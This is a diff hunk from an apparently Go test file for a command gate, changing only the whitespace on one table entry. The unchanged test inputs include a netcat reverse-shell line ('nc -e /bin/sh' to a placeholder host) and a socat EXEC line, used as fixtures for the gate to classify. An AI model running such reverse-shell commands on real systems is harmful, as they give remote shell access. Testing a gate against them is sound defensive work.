@@ -349,7 +349,7 @@ func TestGateLocalTargets(t *testing.T) {
 	for line, want := range map[string]string{
 		"exec u@127.0.0.1 --read-only -- 'socat - EXEC:id'":                 R,
 		"exec me --read-only -- 'nc -e /bin/sh h 1'":                        R,
-		"exec lh --script ./check.sh --read-only":                                  R,
+		"exec lh --script ./check.sh --read-only":                           R,
 		"job start v6 --read-only -- du -sh /var":                           R,
 		"docker exec me app --read-only ls":                                 R,
 		"cluster exec k8slocal pod/x --read-only -- ls":                     R,
